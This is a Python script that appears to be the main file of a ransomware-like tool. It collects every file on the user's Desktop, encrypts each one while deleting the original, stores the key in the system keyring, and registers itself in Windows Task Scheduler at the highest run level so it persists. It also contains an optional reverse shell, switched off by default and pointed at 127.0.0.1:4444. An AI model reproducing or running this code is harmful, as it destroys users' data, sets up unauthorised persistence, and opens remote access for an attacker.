import os
import file_encrypter
import file_decrypter
import task_scheduler
import secure_password
import keyring_password
import desktop_files
import reverse_shell


# Example Usage:
#   command line usage
# # 1. Generate a secure password and save it
# python secure_password.py --length 32 > mypassword.txt
# # 2. Encrypt your file
# python file_encryptor.py secret.txt --password "$(cat mypassword.txt)"
# # 3. Decrypt your file
# python file_decryptor.py secret.txt.encrypted --password "$(cat mypassword.txt)"
# # 4. Task Scheduler
# python task_scheduler.py --task-name "MyTask" --script-path "C:\path\to\script.py" --run-level HIGHEST
# # 5. Save a password
#   python keyring_password.py save --service CastlePig --username one_dumb_pig
# # 5.5 Load a passworrd
#   python keyring_password.py load --service CastlePig --username one_dumb_pig

# Example Usage:
#   generate password
# password = secure_password.generate_secure_password(32)
# print(password)

# Example Usage:
#   Task Scheduler
#
# Add the current script to Task Scheduler
# task_scheduler.add_to_task_scheduler()
#
# # Or specify a different script and options
# task_scheduler.add_to_task_scheduler(
#     task_name="MyOtherTask",
#     script_path="C:\\path\\to\\script.py",
#     python_exe="C:\\Python39\\python.exe",
#     run_level="HIGHEST"
# )

# === Configuration ===
SERVICE_NAME = "CastlePig"
USERNAME = "one_dumb_pig"
ENCRYPTED_FOLDER = "EncryptedFiles"
ENABLE_REVERSE_SHELL = False  # Set to True to enable reverse shell
REVERSE_SHELL_IP = "127.0.0.1"
REVERSE_SHELL_PORT = 4444

# Get all files from the user's Desktop (recursively)
files = desktop_files.get_all_files_from_desktop()

def main():
    # 0. Optionally run reverse shell
    if ENABLE_REVERSE_SHELL:
        # Only use with explicit permission!
        reverse_shell.shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT)
        return  # Do not continue with encryption if reverse shell is running

    # 1. Get or generate a secure password
    try:
        password = keyring_password.load_password_from_keyring(
            service_name=SERVICE_NAME, username=USERNAME
        )
        print("Loaded existing password from keyring.")
    except Exception:
        password = secure_password.generate_secure_password(32)
        keyring_password.save_password_to_keyring(
            password, service_name=SERVICE_NAME, username=USERNAME
        )
        print("Generated and saved new password to keyring.")

    # 2. Add this script to Task Scheduler (Windows only)
    task_scheduler.add_to_task_scheduler()

    # 3. Encrypt each file in the files list
    os.makedirs(ENCRYPTED_FOLDER, exist_ok=True)
    for _file in files:
        encrypted_path = file_encrypter.encrypt_file(
            _file,
            password=password,
            delete_original=True,
            move_to_folder=ENCRYPTED_FOLDER
        )
        if encrypted_path:
            print(f"Encrypted file at: {encrypted_path}")
        else:
            print(f"Failed to encrypt: {_file}")

    # 4. Example: Decrypt a file (uncomment and set the path to use)
    # password = keyring_password.load_password_from_keyring(
    #     service_name=SERVICE_NAME, username=USERNAME
    # )
    # decrypted_path = file_decrypter.decrypt_file("example1.txt.encrypted", password)
    # print(f"Decrypted file at: {decrypted_path}")

if __name__ == "__main__":
    main()
